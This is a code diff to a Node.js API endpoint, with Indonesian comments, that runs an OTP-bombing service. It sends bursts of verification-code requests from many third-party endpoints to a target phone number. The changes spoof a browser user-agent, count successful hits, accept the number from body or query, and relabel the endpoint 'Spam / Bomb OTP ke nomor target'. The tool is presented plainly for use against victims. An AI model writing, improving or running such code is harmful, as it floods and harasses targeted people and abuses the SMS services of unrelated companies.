@@ -33,15 +33,28 @@ async function sendOtpBomb(phone) {
     for (const ep of otpEndpoints) {
         try {
             const config = {
-                headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) },
-                timeout: 5000 
+                headers: { 
+                    "Content-Type": "application/json", 
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", 
+                    ...(ep.headers || {}) 
+                },
+                timeout: 5000,
+                validateStatus: () => true // Mencegah Axios crash/throw error jika API target mengembalikan status 404/500
             };
+            
+            let res;
             if (ep.method === "GET") {
-                await axios.get(ep.url, config);
+                res = await axios.get(ep.url, config);
             } else {
-                await axios.post(ep.url, ep.data, config);
+                res = await axios.post(ep.url, ep.data, config);
             }
-            success++;
+
+            // Anggap sukses jika server merespon dengan status sukses (200-299)
+            if (res.status >= 200 && res.status < 300) {
+                success++;
+            } else {
+                failed++;
+            }
         } catch {
             failed++;
         }
@@ -61,23 +74,25 @@ module.exports = {
     isApikey: true,
     handler: async (req, res) => {
         try {
-            const { phone, q } = req.query;
+            // Mengambil input dari body (khas POST) maupun query (khas GET) agar fleksibel dan tidak eror 404
+            const phone = req.body?.phone || req.query?.phone;
+            const q = req.body?.q || req.query?.q;
             const input = phone || q;
 
             if (!input) {
                 return res.status(400).json({
                     status: false,
-                    creator: 'Rin',
-                    message: 'nomor diperlukan: contoh: 0812345678910'
+                    creator: 'Rin imup',
+                    message: 'nomor diperlukan! contoh parameter body/query: phone=08123456789'
                 });
             }
 
-            const cleanPhone = input.trim().replace(/[^0-9]/g, "");
-            if (!cleanPhone) {
+            const cleanPhone = String(input).trim().replace(/[^0-9]/g, "");
+            if (!cleanPhone || cleanPhone.length < 9) {
                 return res.status(400).json({
                     status: false,
-                    creator: 'Rin',
-                    message: 'Nomor HP tidak valid. Pastikan hanya berisi angka.'
+                    creator: 'Rin imup',
+                    message: 'Nomor HP tidak valid. Pastikan nomor benar dan hanya berisi angka.'
                 });
             }
 
@@ -85,7 +100,7 @@ module.exports = {
 
             const responseData = {
                 status: true,
-                creator: 'Rin',
+                creator: 'Rin imup',
                 data: {
                     phone: result.phone,
                     total_request: result.total_request,
@@ -99,22 +114,22 @@ module.exports = {
         } catch (err) {
             res.status(500).json({
                 status: false,
-                creator: 'Rin',
+                creator: 'Rin imup',
                 message: err.message || 'Terjadi kesalahan saat memproses permintaan'
             });
         }
     },
     metadata: {
-    category: "Tools",
-    description: "Deskripsi endpoint",
-    isApikey: true,
-    parameters: [
-      {
-        name: "phone",
-        in: "query",
-        required: true,
-        description: "Nomor HP"
-      }
-    ]
-  }
+        category: "Tools",
+        description: "Spam / Bomb OTP ke nomor target menggunakan multi-endpoint API",
+        isApikey: true,
+        parameters: [
+            {
+                name: "phone",
+                in: "body",
+                required: true,
+                description: "Nomor HP Target (contoh: 0812xxxxxxxx)"
+            }
+        ]
+    }
 };
